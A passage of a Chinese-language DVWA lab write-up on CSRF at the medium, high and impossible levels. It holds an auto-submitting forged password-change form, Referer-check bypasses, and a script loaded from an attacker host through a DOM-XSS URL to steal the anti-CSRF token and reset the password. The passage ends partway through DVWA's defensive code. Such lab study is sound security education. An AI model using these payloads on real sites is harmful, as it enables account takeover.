class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">submit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"medium级-3\"><a class=\"anchor\" href=\"#medium级-3\">#</a> medium 级</h3>\n<p>直接点击 <code>http://192.168.23.129:8001/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code> 并不会修改成功。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240715215543654.png\" alt=\"image-20240715215543654\" /></p>\n<p>查看源码，发现新增 referer 检测</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'HTTP_REFERER'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'SERVER_NAME'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>$_SERVER[ 'HTTP_REFERER' ] </code> 中查找 <code>$_SERVER[ 'SERVER_NAME' ]</code> ，即在 Referer 中查找 Host</p>\n<p><img loading=\"lazy\" data-src=\"image-20240715212100648.png\" alt=\"image-20240715212100648\" /></p>\n<p>也就是说 Referer 中只要有 Host 即可</p>\n<ol>\n<li>目录混淆 referer</li>\n</ol>\n<p>其他服务器中新建一个目录名为 <code>192.168.23.129</code> （该目录名要与靶机的 Host 一致）构造 <code>csrf.html</code>  页面放到 <code>192.168.23.129</code>  目录下：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>CSRF<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>get<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>csrf<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://192.168.23.129:8001/vulnerabilities/csrf/<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password_new<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>2222<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password_conf<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>2222<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Change<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Change<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"> document<span class=\"token punctuation\">.</span>forms<span class=\"token punctuation\">[</span><span class=\"token string\">\"csrf\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">submit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>受害者访问 <code>http://192.168.23.1/192.168.23.129/csrf.html</code>  会自动修改密码</p>\n<p><img loading=\"lazy\" data-src=\"image-20240715220233820.png\" alt=\"image-20240715220233820\" /></p>\n<ol start=\"2\">\n<li><code>?</code>  混淆 referer</li>\n</ol>\n<p>受害者访问 <code>http://192.168.23.1:8000/csrf.html?192.168.23.129</code>  会自动修改密码</p>\n<p><code>?</code>  后为传递参数，html 页面无法接受参数，不影响 html 页面，可以混淆 referer</p>\n<p><img loading=\"lazy\" data-src=\"image-20240715220842568.png\" alt=\"image-20240715220842568\" /></p>\n<ol start=\"3\">\n<li>文件名混淆 referer</li>\n</ol>\n<p>将 <code>csrf.html</code>  改名为 <code>192.168.23.129.html</code> ，受害者访问 <code>http://192.168.23.1:8000/192.168.23.129.html</code>  会自动修改密码</p>\n<p><img loading=\"lazy\" data-src=\"image-20240715221156445.png\" alt=\"image-20240715221156445\" /></p>\n<h3 id=\"high级-3\"><a class=\"anchor\" href=\"#high级-3\">#</a> high 级</h3>\n<p>high 增加了 token 检测</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240715222832163.png\" alt=\"image-20240715222832163\" /></p>\n<p>需要配合 <code>XSS(DOM)</code>  模块:</p>\n<p>编写 <code>xss.js</code>  放到攻击者的服务器下 <code>http://192.168.23.1:8000/xss.js</code> ，js 编写思路：向 <code>csrf-high</code>  发送请求获取响应然后提取 token，然后发送带 token 的请求，即可修改密码成功。如果使用 <code>XMLHttpRequest</code>  对象发送一个同步请求来获取响应，可能会导致线程阻塞，从而导致代码不起作用，更好的做法是使用异步请求来发送 HTTP 请求并处理响应，它将在后台进行处理，不会阻塞主线程的执行，这允许代码继续执行后续操作，而无需等待服务器的响应。</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> theUrl <span class=\"token operator\">=</span> <span class=\"token string\">'http://192.168.23.129:8001/vulnerabilities/csrf/'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> xmlhttp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">.</span>XMLHttpRequest<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    xmlhttp <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XMLHttpRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    xmlhttp <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ActiveXObject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Microsoft.XMLHTTP\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>xmlhttp<span class=\"token punctuation\">.</span>withCredentials <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>xmlhttp<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onreadystatechange</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>xmlhttp<span class=\"token punctuation\">.</span>readyState <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token operator\">&amp;&amp;</span> xmlhttp<span class=\"token punctuation\">.</span>status <span class=\"token operator\">==</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">var</span> text <span class=\"token operator\">=</span> xmlhttp<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">var</span> regex <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">user_token\\' value\\=\\'(.*?)\\' \\/\\></span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">var</span> match <span class=\"token operator\">=</span> text<span class=\"token punctuation\">.</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span>regex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>match<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>match<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//token 值弹窗</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">var</span> token <span class=\"token operator\">=</span> match<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">var</span> new_url <span class=\"token operator\">=</span> <span class=\"token string\">'http://192.168.23.129:8001/vulnerabilities/csrf/?user_token='</span> <span class=\"token operator\">+</span> token <span class=\"token operator\">+</span> <span class=\"token string\">'&amp;password_new=123.com&amp;password_conf=123.com&amp;Change=Change'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>count <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">var</span> xmlhttp2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">.</span>XMLHttpRequest<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                xmlhttp2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XMLHttpRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                xmlhttp2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ActiveXObject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Microsoft.XMLHTTP\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            xmlhttp2<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> new_url<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//true 通过将请求设置为异步</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            xmlhttp2<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>xmlhttp<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> theUrl<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>xmlhttp<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>受害者点击 <code>http://192.168.23.129:8001/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src=&quot;http://192.168.23.1:8000/xss.js&quot;&gt;&lt;/script&gt;</code>  会直接修改密码。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240717140709852.png\" alt=\"image-20240717140709852\" /></p>\n<h3 id=\"impossible级-3\"><a class=\"anchor\" href=\"#impossible级-3\">#</a> impossible 级</h3>\n<p>对于 CSRF 的防范，参考 DVWA 的 impossible 的代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Change'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Check Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$pass_curr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_current'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$pass_new</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_new'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$pass_conf</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_conf'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// Sanitise current password input</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$pass_curr</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_curr</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$pass_curr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass_curr</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$pass_curr</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_curr</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// Check that the current password is correct</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">dvwaCurrentUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':password'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pass_curr</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// Do both new passwords match and does the current password match the user?</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$pass_conf</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">rowCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token comment\">// It does!</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 